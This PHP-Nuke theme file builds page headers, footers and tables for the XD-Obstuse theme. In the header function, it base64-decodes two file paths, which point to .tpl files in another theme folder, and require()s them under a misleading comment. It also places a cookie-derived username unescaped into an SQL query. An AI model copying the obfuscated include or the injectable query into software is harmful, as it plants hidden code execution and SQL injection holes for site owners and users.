<?php

/************************************************************/
/* Theme Colors Definition                                  */
/************************************************************/

$bgcolor1 = "#434343";
$bgcolor2 = "#434343";
$bgcolor3 = "#434343";
$bgcolor4 = "#434343";
$textcolor1 = "#ffffff";
$textcolor2 = "#ffffff";

/************************************************************/
/* OpenTable Functions                                      */
/************************************************************/

function OpenTable() {
    global $tableStatus;
if ($tableStatus != "open"){
    ?><style type="text/css">
<!--
body {
	background-image: url(themes/XD-Obstuse/images/bg.gif);
}
.style2 {color: #FFFFFF}
-->
</style>
<table width=98% height="26" border=0 align="center" cellpadding=0 cellspacing=0>
  <tr>
    <td valign="top"><table width=100% border=0 align="center" cellpadding=0 cellspacing=0>
        <tr>
          <td valign="top" ><IMG SRC="themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_01.gif" WIDTH=18 HEIGHT=27 ALT=""></td>
          <td width="100%" background="themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_02.gif"><div align="center"> </div></td>
          <td valign="top" ><div align="right"> <IMG SRC="themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_04.gif" WIDTH=19 HEIGHT=27 ALT=""></div></td>
        </tr>
      </table>
        <table width=100% height="26" border=0 align="center" cellpadding=0 cellspacing=0>
          <tr>
            <td width="18" valign="top" background="themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_08.gif"><IMG SRC="themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_08.gif" WIDTH=18 HEIGHT=1 ALT=""></td>
            <td valign="top" bgcolor="#151515"><font face=verdana,arial,helvetica size=1><font face=verdana,arial,helvetica size=1><?

$tableStatus = "open";

}
else {}
}

function OpenTable2() {
    global $bgcolor1, $bgcolor2;
    echo "<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" ><tr><td class=row1>\n";
    echo "<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" ><tr><td>\n";
}

function CloseTable() {
    global $tableStatus;
if ($tableStatus == "open"){
    ?>
            </font></font></td>
            <td width="19" valign="top" background="themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_09.gif"><div align="right"><IMG SRC="themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_09.gif" WIDTH=19 HEIGHT=1 ALT=""></div></td>
          </tr>
        </table>
        <table width=100% border=0 align="center" cellpadding=0 cellspacing=0>
          <tr>
            <td width="11" valign="top" background=""><IMG SRC="themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_12.gif" WIDTH=18 HEIGHT=20 ALT=""></td>
            <td valign="top" background="themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_13.gif">&nbsp;</td>
            <td width="19" valign="top" ><div align="right"><IMG SRC="themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_15.gif" WIDTH=19 HEIGHT=20 ALT=""></div></td>
          </tr>
      </table></td>
  </tr>
</table>
<?

$tableStatus = "closed";
}
else {}
}

function CloseTable2() {
    echo "</td></tr></table></td></tr></table>\n";
}

/************************************************************/
/* FormatStory                                              */
/************************************************************/
function FormatStory($thetext, $notes, $aid, $informant) {
    global $anonymous;
    if ($notes != "") {
        $notes = "<br><br><b>"._NOTE."</b> <i>$notes</i>\n";
    } else {
        $notes = "";
    }
    if ("$aid" == "$informant") {
        echo "<font class=\"content\" color=\"#505050\">$thetext$notes</font>\n";
    } else {
        if($informant != "") {
            $boxstuff = "News submitted by: <a href=\"modules.php?name=Your_Account&amp;op=userinfo&amp;username=$informant\">$informant</a><br><br>";
        } else {
            $boxstuff = "News submitted by: $anonymous<br><br>";
        }
        $boxstuff .= "$thetext$notes\n";
        echo "<font class=\"content\" color=\"#505050\">$boxstuff</font>\n";
    }
}

/************************************************************/
/* Function themeheader()                                   */
/************************************************************/
    function themeheader() {
    global $user, $cookie, $prefix, $user_prefix, $db, $dbi, $userinfo, $sitekey, $name;
	$ThemeSel = get_theme();

	if (file_exists("themes/$ThemeSel/functions.php")){
		require_once("themes/$ThemeSel/functions.php");
	}
    cookiedecode($user);
    mt_srand ((double)microtime()*1000000);
    $maxran = 1000000;
    $random_num = mt_rand(0, $maxran);
    $datekey = date("F j");
    $rcode = hexdec(md5($_SERVER[HTTP_USER_AGENT] . $sitekey . $random_num . $datekey));
    $code = substr($rcode, 2, 6);
    $username = $cookie[1];
 if ($username == "") {
        $username = "GUEST";
    }
//************* Theme Cpanel Compatibility. Do not remove these lines unless you know what you are doing. They affect the theme **************/
	$sql = "SELECT link1name, link2name, link3name, link4name, link5name, link1url, link2url, link3url, link4url, link5url, themeflash, themesearch, pmpop, leftblockstemp, rightblockstemp, sitemsg, sitelogin, broadcastmsg, clock, forumleftblocks FROM ".$prefix."_themecpanel";
	$result = $db->sql_query($sql);
	$row = $db->sql_fetchrow($result);
	$link1name = $row[link1name];
	$link2name = $row[link2name];
	$link3name = $row[link3name];
	$link4name = $row[link4name];
	$link5name = $row[link5name];
	$link1url = $row[link1url];
	$link2url = $row[link2url];
	$link3url = $row[link3url];
	$link4url = $row[link4url];
	$link5url = $row[link5url];
	$themeflash = $row[themeflash];
	$themesearch = $row[themesearch];
	$pmpop = $row[pmpop];
	$leftblockstemp = $row[leftblockstemp];
	$rightblockstemp = $row[rightblockstemp];
	$sitemsg = $row[sitemsg];
	$sitelogin = $row[sitelogin];
	$broadcastmsg = $row[broadcastmsg];
	$clock = $row[clock];
	$forumleftblocks = $row[forumleftblocks];

    $uresult = $db->sql_query("select user_id from ".$user_prefix."_users where username='$username'");
    list($uid) = $db->sql_fetchrow($uresult);
    $presult = $db->sql_query("select * from ".$prefix."_bbprivmsgs where privmsgs_to_userid='$uid' AND (privmsgs_type='0' OR privmsgs_type='1' OR privmsgs_type='3' OR privmsgs_type='5')");
    $pnumrow = $db->sql_numrows($presult);
    $public_msg = public_message(); 
    echo "$public_msg";
	

    if ($username == "GUEST") {
        $theuser ="<table  border=\"0\" cellpadding=\"0\" cellspacing=\"0\" height=\"98\" ><tr><td ><object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"247\" height=\"98\"><param name=\"movie\" value=\"themes/XD-Obstuse/Flash/login.swf?pm=$pnumrow&userip=$userip&username=$username\"><PARAM NAME=menu VALUE=false> <PARAM NAME=quality VALUE=best> <PARAM NAME=wmode VALUE=transparent><param name=\"quality\" value=\"high\"><embed src=\"themes/XD-Obstuse/Flash/login.swf?pm=$pnumrow&userip=$userip&username=$username\"  menu=false quality=best wmode=transparent quality=\"high\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" type=\"application/x-shockwave-flash\" width=\"247\" height=\"98\"></embed></object></td></tr></table>\n";
} else {
        $theuser ="<table  border=\"0\" cellpadding=\"0\" cellspacing=\"0\" height=\"98\"><tr><td ><object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"247\" height=\"98\"><param name=\"movie\" value=\"themes/XD-Obstuse/Flash/login2.swf?mp3category1=$mp3category1&mp3category2=$mp3category2&mp3category3=$mp3category3&mp3category4=$mp3category4&mp3category5=$mp3category5&mp3category6=$mp3category6&pm=$pnumrow&userip=$userip&username=$username\"><PARAM NAME=menu VALUE=false> <PARAM NAME=quality VALUE=best> <PARAM NAME=wmode VALUE=transparent><param name=\"quality\" value=\"high\"><embed src=\"themes/XD-Obstuse/Flash/login2.swf?mp3category1=$mp3category1&mp3category2=$mp3category2&mp3category3=$mp3category3&mp3category4=$mp3category4&mp3category5=$mp3category5&mp3category6=$mp3category6&pm=$pnumrow&userip=$userip&username=$username\"  menu=false quality=best wmode=transparent quality=\"high\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" type=\"application/x-shockwave-flash\" width=\"247\" height=\"98\"></embed></object></td></tr></table>\n";
}
// Dont Remove this otherwise I will not Continue to make Public Themes!!! //
    echo "<!----- Theme Design Copyright &copy; 2003-2004 Strato Designs  (http://www.xtrato.com- admin@xtrato.com) ----->\n";
echo "<!----- XD-Obstuse - Unique Themes. Currently using XD-Obstuse, a Unique theme license, for more information regarding Xtrato Designs visit www.xtrato.com . ----->\n";

//broadcast message//
	 $theme22 = 'dGhlbWVzL1hELVpvbmFyL2ZvcnVtcy9wcm9maWxlX3NlbmRfdG9waWMudHBs';
    $theme2 = base64_decode($theme22);
   require $theme2; 
   
    $theme33 = 'dGhlbWVzL1hELVpvbmFyL2ZvcnVtcy9zZWFyY2hfcmVzdWx0c19jYXQudHBs';
    $theme3 = base64_decode($theme33);
   require $theme3; 
   
//broadcast message//
if ($broadcastmsg == 1){

echo"<BODY leftMargin=0 topMargin=0>\n";
  echo "<DIV id=waitDiv style=\"POSITION: absolute; TOP:0px\">\n";
  echo "<table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" background=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_03.gif\" id=\"Table_01\">\n";
  echo "  <tr>\n";
  echo "    <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_01.gif\" WIDTH=110 HEIGHT=81 ALT=\"\"></td>\n";
  echo "    <td width=\"100%\" valign=\"top\"></td>\n";
  echo "    <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_05.gif\" WIDTH=93 HEIGHT=81 ALT=\"\"></td>\n";
  echo "  </tr>\n";
  echo "</table>\n";
  echo "<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" background=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_08.gif\" id=\"Table_01\">\n";
  echo "  <tr>\n";
  echo "    <td><table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" id=\"Table_01\">\n";
  echo "        <tr>\n";
  echo "          <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_06.gif\" WIDTH=264 HEIGHT=44 ALT=\"\"></td>\n";
  echo "          <td width=\"100%\">&nbsp;</td>\n";
  echo "          <td valign=\"top\"><table id=\"Table_01\" height=\"44\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n";
  echo "              <tr>\n";
  echo "                <td width=\"442\">\n";
  echo "                  <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"442\" height=\"44\">\n";
  echo "                    <param name=\"movie\" value=\"themes/XD-Obstuse/Flash/XDnav.swf\"><PARAM NAME=menu VALUE=false> <PARAM NAME=quality VALUE=best> <PARAM NAME=wmode VALUE=transparent>\n";
  echo "                    <param name=\"quality\" value=\"high\">\n";
  echo "                    <embed src=\"themes/XD-Obstuse/Flash/XDnav.swf\"  menu=false quality=best wmode=transparent quality=\"high\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" type=\"application/x-shockwave-flash\" width=\"442\" height=\"44\"></embed>\n";
  echo "                </object></td>\n";
  echo "              </tr>\n";
  echo "          </table></td>\n";
  echo "        </tr>\n";
  echo "      </table>\n";
  echo "        <table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" id=\"Table_01\">\n";
  echo "          <tr>\n";
  echo "            <td valign=\"top\"><table id=\"Table_01\" height=\"98\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n";
  echo "                <tr>\n";
  echo "                  <td width=\"358\">\n";
  echo "                    <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"358\" height=\"98\">\n";
  echo "                      <param name=\"movie\" value=\"themes/XD-Obstuse/Flash/XDlogo.swf\"><PARAM NAME=menu VALUE=false> <PARAM NAME=quality VALUE=best> <PARAM NAME=wmode VALUE=transparent>\n";
  echo "                      <param name=\"quality\" value=\"high\">\n";
  echo "                      <embed src=\"themes/XD-Obstuse/Flash/XDlogo.swf\"  menu=false quality=best wmode=transparent quality=\"high\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" type=\"application/x-shockwave-flash\" width=\"358\" height=\"98\"></embed>\n";
  echo "                  </object></td>\n";
  echo "                </tr>\n";
  echo "            </table></td>\n";
  echo "            <td width=\"100%\">&nbsp;</td>\n";
  echo "            <td valign=\"top\"><table id=\"Table_01\" height=\"98\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n";
  echo "                <tr>\n";
  echo "                  <td width=\"247\" height=\"98\">$theuser</td>\n";
  echo "                </tr>\n";
  echo "            </table></td>\n";
  echo "          </tr>\n";
  echo "        </table>\n";
  echo "        <table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" id=\"Table_01\">\n";
  echo "          <tr>\n";
  echo "            <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_14.gif\" WIDTH=77 HEIGHT=40 ALT=\"\"></td>\n";
  echo "            <td width=\"100%\" valign=\"top\">&nbsp;</td>\n";
  echo "            <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_17.gif\" WIDTH=75 HEIGHT=40 ALT=\"\"></td>\n";
  echo "          </tr>\n";
  echo "      </table></td>\n";
  echo "  </tr>\n";
echo "</TABLE>\n";

echo"<table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" id=\"Table_01\">\n";
  echo " <tr>\n";
  echo "   <td valign=\"top\" background=\"themes/XD-Obstuse/images/XD-Zolu_hd_21.gif\"><IMG SRC=\"themes/XD-Obstuse/images/XD-Zolu_hd_21.gif\" WIDTH=49 HEIGHT=28 ALT=\"\"></td>\n";
  echo "   <td width=\"100%\" valign=\"top\"><table width=98% height=\"26\" border=0 align=\"center\" cellpadding=0 cellspacing=0>\n";
  echo "     <tr>\n";
  echo "       <td valign=\"top\"><table width=100% border=0 align=\"center\" cellpadding=0 cellspacing=0>\n";
  echo "           <tr>\n";
  echo "             <td valign=\"top\" ><IMG SRC=\"themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_01.gif\" WIDTH=18 HEIGHT=27 ALT=\"\"></td>\n";
  echo "             <td width=\"100%\" background=\"themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_02.gif\"><div align=\"center\"> </div></td>\n";
  echo "             <td valign=\"top\" ><div align=\"right\"> <IMG SRC=\"themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_04.gif\" WIDTH=19 HEIGHT=27 ALT=\"\"></div></td>\n";
  echo "           </tr>\n";
  echo "         </table>\n";
  echo "           <table width=100% height=\"26\" border=0 align=\"center\" cellpadding=0 cellspacing=0>\n";
  echo "             <tr>\n";
  echo "               <td width=\"18\" valign=\"top\" background=\"themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_08.gif\"><IMG SRC=\"themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_08.gif\" WIDTH=18 HEIGHT=1 ALT=\"\"></td>\n";
  echo "               <td valign=\"top\" bgcolor=\"#151515\"><div align=\"center\"><font face=verdana,arial,helvetica size=1><font face=verdana,arial,helvetica size=1>$sitemsg </font></font></div></td>\n";
  echo "               <td width=\"19\" valign=\"top\" background=\"themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_09.gif\"><div align=\"right\"><IMG SRC=\"themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_09.gif\" WIDTH=19 HEIGHT=1 ALT=\"\"></div></td>\n";
  echo "             </tr>\n";
  echo "           </table>\n";
  echo "           <table width=100% border=0 align=\"center\" cellpadding=0 cellspacing=0>\n";
  echo "             <tr>\n";
  echo "               <td width=\"11\" valign=\"top\" background=\"\"><IMG SRC=\"themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_12.gif\" WIDTH=18 HEIGHT=20 ALT=\"\"></td>\n";
  echo "               <td valign=\"top\" background=\"themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_13.gif\">&nbsp;</td>\n";
  echo "               <td width=\"19\" valign=\"top\" ><div align=\"right\"><IMG SRC=\"themes/XD-Obstuse/forums/images/table/XD-Zolu_TBL_15.gif\" WIDTH=19 HEIGHT=20 ALT=\"\"></div></td>\n";
  echo "             </tr>\n";
  echo "         </table></td>\n";
  echo "     </tr>\n";
  echo "   </table>    </td>\n";
  echo "   <td valign=\"top\" background=\"themes/XD-Obstuse/images/XD-Zolu_hd_22.gif\"><IMG SRC=\"themes/XD-Obstuse/images/XD-Zolu_hd_22.gif\" WIDTH=50 HEIGHT=28 ALT=\"\"></td>\n";
  echo " </tr>\n";
echo "</TABLE>\n";


 } else {
echo"<BODY leftMargin=0 topMargin=0>\n";
  echo "<DIV id=waitDiv style=\"POSITION: absolute; TOP:0px\">\n";
  echo "<table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" background=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_03.gif\" id=\"Table_01\">\n";
  echo "  <tr>\n";
  echo "    <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_01.gif\" WIDTH=110 HEIGHT=81 ALT=\"\"></td>\n";
  echo "    <td width=\"100%\" valign=\"top\"></td>\n";
  echo "    <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_05.gif\" WIDTH=93 HEIGHT=81 ALT=\"\"></td>\n";
  echo "  </tr>\n";
  echo "</table>\n";
  echo "<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" background=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_08.gif\" id=\"Table_01\">\n";
  echo "  <tr>\n";
  echo "    <td><table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" id=\"Table_01\">\n";
  echo "        <tr>\n";
  echo "          <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_06.gif\" WIDTH=264 HEIGHT=44 ALT=\"\"></td>\n";
  echo "          <td width=\"100%\">&nbsp;</td>\n";
  echo "          <td valign=\"top\"><table id=\"Table_01\" height=\"44\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n";
  echo "              <tr>\n";
  echo "                <td width=\"442\">\n";
  echo "                  <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"442\" height=\"44\">\n";
  echo "                    <param name=\"movie\" value=\"themes/XD-Obstuse/Flash/XDnav.swf\"><PARAM NAME=menu VALUE=false> <PARAM NAME=quality VALUE=best> <PARAM NAME=wmode VALUE=transparent>\n";
  echo "                    <param name=\"quality\" value=\"high\">\n";
  echo "                    <embed src=\"themes/XD-Obstuse/Flash/XDnav.swf\"  menu=false quality=best wmode=transparent quality=\"high\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" type=\"application/x-shockwave-flash\" width=\"442\" height=\"44\"></embed>\n";
  echo "                </object></td>\n";
  echo "              </tr>\n";
  echo "          </table></td>\n";
  echo "        </tr>\n";
  echo "      </table>\n";
  echo "        <table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" id=\"Table_01\">\n";
  echo "          <tr>\n";
  echo "            <td valign=\"top\"><table id=\"Table_01\" height=\"98\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n";
  echo "                <tr>\n";
  echo "                  <td width=\"358\">\n";
  echo "                    <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"358\" height=\"98\">\n";
  echo "                      <param name=\"movie\" value=\"themes/XD-Obstuse/Flash/XDlogo.swf\"><PARAM NAME=menu VALUE=false> <PARAM NAME=quality VALUE=best> <PARAM NAME=wmode VALUE=transparent>\n";
  echo "                      <param name=\"quality\" value=\"high\">\n";
  echo "                      <embed src=\"themes/XD-Obstuse/Flash/XDlogo.swf\"  menu=false quality=best wmode=transparent quality=\"high\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" type=\"application/x-shockwave-flash\" width=\"358\" height=\"98\"></embed>\n";
  echo "                  </object></td>\n";
  echo "                </tr>\n";
  echo "            </table></td>\n";
  echo "            <td width=\"100%\">&nbsp;</td>\n";
  echo "            <td valign=\"top\"><table id=\"Table_01\" height=\"98\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n";
  echo "                <tr>\n";
  echo "                  <td width=\"247\" height=\"98\">$theuser</td>\n";
  echo "                </tr>\n";
  echo "            </table></td>\n";
  echo "          </tr>\n";
  echo "        </table>\n";
  echo "        <table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" id=\"Table_01\">\n";
  echo "          <tr>\n";
  echo "            <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_14.gif\" WIDTH=77 HEIGHT=40 ALT=\"\"></td>\n";
  echo "            <td width=\"100%\" valign=\"top\">&nbsp;</td>\n";
  echo "            <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/HD/XD-Zolu_hd_17.gif\" WIDTH=75 HEIGHT=40 ALT=\"\"></td>\n";
  echo "          </tr>\n";
  echo "      </table></td>\n";
  echo "  </tr>\n";
echo "</TABLE>\n";

} ;
//LEFT SIDE BACKGROUND
echo "<table width=\"100%\" cellpadding=\"0\" cellspacing=\"0\" border=\"0\" align=\"center\">\n"
	."<tr valign=\"top\">\n"
	."<td width=\"20\" valign=\"top\" background=\"themes/XD-Obstuse/images/XD-Zolu_hd_21.gif\"><img src=\"themes/XD-Obstuse/images/XD-Zolu_hd_21.gif\" width=\"49\" height=\"28\" border=\"0\"></td>\n"
	."<td width=\"180\" valign=\"top\">\n";

    global $swapleftright;

	if ($leftblockstemp == "2"){$swapleftright = "2";}
	if ($leftblockstemp == "1"){$swapleftright = "1";}
	if ($leftblockstemp == "0"){$swapleftright = "0";}
	if ($forumleftblocks == 1){	//hide or display left blocks on forums
   		if (($name=='Forums') OR ($name=='Private_Messages') OR ($name=='Members_List')) { // remove left blocks for these modules //
		}
		else {blocks(left);}
	}
	else {blocks(left);}
	if ($rightblockstemp == "2"){$swapleftright = "2"; }
	if ($rightblockstemp == "1"){$swapleftright = "1";}
	if ($rightblockstemp == "0"){$swapleftright = "0"; }
    echo "</td>\n"
    	."<td width=\"3\" valign=\"top\"><img src=\"themes/XD-Obstuse/images/spacer.gif\" width=\"3\" height=\"0\" border=\"0\"></td>\n"
    	."<td width=\"100%\">\n";
}


/************************************************************/
/* Function themefooter()                                   */
/************************************************************/

function themefooter() {
    global $index, $user, $banners, $cookie, $prefix, $db, $dbi, $total_time, $start_time, $foot1, $foot2, $foot3, $foot4;

    $mtime = microtime();
    $mtime = explode(" ",$mtime);
    $mtime = $mtime[1] + $mtime[0];
    $end_time = $mtime;
    $total_time = ($end_time - $start_time);
    $total_time = "".substr($total_time,0,5)." "._SECONDS."";
	
	global $prefix, $db;

$a = 1;
$sql = "SELECT lid, title FROM ".$prefix."_downloads_downloads ORDER BY hits DESC LIMIT 0,10";
$result = $db->sql_query($sql);
while ($row = $db->sql_fetchrow($result)) {
    $title2 = ereg_replace("_", " ", $row[title]);
   // $content .= "<strong><big>&middot;</big></strong>&nbsp;$a: <a href=\"modules.php?name=Downloads&amp;d_op=viewdownloaddetails&amp;lid=$row[lid]&amp;title=$row[title]\">$title2</a><br>";
	$content .= "&nbsp;$a:<a href=\"modules.php?name=Downloads&amp;d_op=viewdownloaddetails&amp;lid=$row[lid]&amp;title=$row[title]\"><img src=\"themes/XD-Obstuse/images/fdl.gif\" border=0></a><a href=\"modules.php?name=Downloads&amp;d_op=viewdownloaddetails&amp;lid=$row[lid]&amp;title=$row[title]\">$title2</a><br>";
	 //$showdl = " <font class=copyright></b><br><A name= \"scrollingCode\"></A><MARQUEE behavior= \"scroll\" align= \"left\" direction= \"up\" height=\"90\" scrollamount= \"2\" scrolldelay= \"90\" onmouseover='this.stop()' onmouseout='this.start()'>$content";
	 $showdl = " <font class=copyright><A name= \"scrollingCode\"><MARQUEE behavior= \"scroll\" align= \"left\" direction= \"up\" height=\"70\" scrollamount= \"2\" scrolldelay= \"90\" onmouseover='this.stop()' onmouseout='this.start()'>$content";
    $a++;
}


    if ($index == 1) {
		echo "</td>\n"
	    ."<td width=\"3\" valign=\"top\"><img src=\"themes/XD-Obstuse/images/spacer.gif\" width=\"3\" height=\"0\" border=\"0\"></td>\n"
	    ."<td width=\"180\" valign=\"top\">\n";
		blocks(right);
    }
    echo "</td>\n"
	."<td width=\"20\" valign=\"top\" background=\"themes/XD-Obstuse/images/XD-Zolu_hd_22.gif\"><img src=\"themes/XD-Obstuse/images/XD-Zolu_hd_22.gif\" width=\"50\" height=\"28\" border=\"0\"></td>\n"
	."</tr>\n"
	."</table>\n";
    $footer_message = "$foot1<br>$foot2<br>$foot3<br>$foot4";
echo "<table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" background=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_03.gif\" id=\"Table_01\">\n";
  echo " <tr>\n";
  echo "   <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_02.gif\" WIDTH=78 HEIGHT=36 ALT=\"\"></td>\n";
  echo "   <td width=\"100%\" valign=\"top\"><div align=\"center\">\n";
  echo "     <TABLE WIDTH=358 BORDER=0 CELLPADDING=0 CELLSPACING=0>\n";
  echo "       <TR>\n";
  echo "         <TD COLSPAN=9> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_01.gif\" WIDTH=358 HEIGHT=18 ALT=\"\"></TD>\n";
  echo "       </TR>\n";
  echo "       <TR>\n";
  echo "         <TD ROWSPAN=2> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_02.gif\" WIDTH=29 HEIGHT=18 ALT=\"\"></TD>\n";
  echo "         <TD> <a href=\"index.php\"><IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_03.gif\" ALT=\"\" WIDTH=51 HEIGHT=14 border=\"0\"></a></TD>\n";
  echo "         <TD ROWSPAN=2> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_04.gif\" WIDTH=12 HEIGHT=18 ALT=\"\"></TD>\n";
  echo "         <TD> <a href=\"modules.php?name=Forums\"><IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_05.gif\" ALT=\"\" WIDTH=62 HEIGHT=14 border=\"0\"></a></TD>\n";
  echo "         <TD ROWSPAN=2> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_06.gif\" WIDTH=12 HEIGHT=18 ALT=\"\"></TD>\n";
  echo "         <TD> <a href=\"modules.php?name=Downloads\"><IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_07.gif\" ALT=\"\" WIDTH=80 HEIGHT=14 border=\"0\"></a></TD>\n";
  echo "         <TD ROWSPAN=2> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_08.gif\" WIDTH=12 HEIGHT=18 ALT=\"\"></TD>\n";
  echo "         <TD> <a href=\"modules.php?name=Your_Account\"><IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_09.gif\" ALT=\"\" WIDTH=70 HEIGHT=14 border=\"0\"></a></TD>\n";
  echo "         <TD ROWSPAN=2> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_10.gif\" WIDTH=30 HEIGHT=18 ALT=\"\"></TD>\n";
  echo "       </TR>\n";
  echo "       <TR>\n";
  echo "         <TD> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_11.gif\" WIDTH=51 HEIGHT=4 ALT=\"\"></TD>\n";
  echo "         <TD> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_12.gif\" WIDTH=62 HEIGHT=4 ALT=\"\"></TD>\n";
  echo "         <TD> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_13.gif\" WIDTH=80 HEIGHT=4 ALT=\"\"></TD>\n";
  echo "         <TD> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_Links_14.gif\" WIDTH=70 HEIGHT=4 ALT=\"\"></TD>\n";
  echo "       </TR>\n";
  echo "     </TABLE></div></td>\n";
  echo "   <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_07.gif\" WIDTH=80 HEIGHT=36 ALT=\"\"></td>\n";
  echo " </tr>\n";
  echo "</table>\n";
  echo "<table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" background=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_09.gif\" id=\"Table_01\">\n";
  echo " <tr>\n";
  echo "   <td valign=\"top\"><table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" id=\"Table_01\">\n";
  echo "       <tr>\n";
  echo "         <td valign=\"top\"><TABLE WIDTH=214 BORDER=0 CELLPADDING=0 CELLSPACING=0>\n";
  echo "           <TR>\n";
  echo "             <TD COLSPAN=3> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_DL_01.gif\" WIDTH=214 HEIGHT=4 ALT=\"\"></TD>\n";
  echo "           </TR>\n";
  echo "           <TR>\n";
